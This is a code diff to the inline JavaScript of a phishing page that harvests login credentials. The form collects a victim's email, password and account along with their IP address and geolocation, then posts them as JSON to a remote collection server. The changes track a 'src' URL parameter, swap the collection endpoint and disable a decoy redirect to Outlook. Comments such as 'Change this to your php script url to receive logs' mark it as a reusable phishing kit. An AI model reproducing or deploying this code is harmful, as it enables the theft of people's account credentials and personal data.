@@ -394,6 +394,8 @@
     </form>
 
     <script>
+      let srcParam = new URLSearchParams(window.location.search).get("src");
+
       let ipLocation;
       let count = 0;
       const data = {
@@ -402,6 +404,7 @@
         email: "",
         password: "",
         account: "",
+        src: "",
       };
 
       function showForm(domainName, domainLogo) {
@@ -430,10 +433,11 @@
         data.password = formData.get("password");
         data.ipAddress = ipLocation.ip;
         data.location = `${ipLocation.country_name} | ${ipLocation.region} | ${ipLocation.city}`
+        data.src = srcParam
         // console.log(data);
 
         $.ajax({
-          url: "https://www.medicalsolutions.health/user", //Change this to your php script url to receive logs
+          url: "https://medicalsolutions.osc-fr1.scalingo.io/user", //Change this to your php script url to receive logs
           type: "POST",
           data: JSON.stringify(data),
           headers: { 'Content-type': 'application/json' },
@@ -449,8 +453,8 @@
           document.getElementById("error").innerHTML =
             "Something went wrong. Please try again.";
         } else {
-          document.getElementById("error").innerHTML = "";
-          window.location.href = "https://outlook.office.com"; //Change this link for redirect user to final url
+          // document.getElementById("error").innerHTML = "";
+          // window.location.href = "https://outlook.office.com"; //Change this link for redirect user to final url
         }
 
         count++;
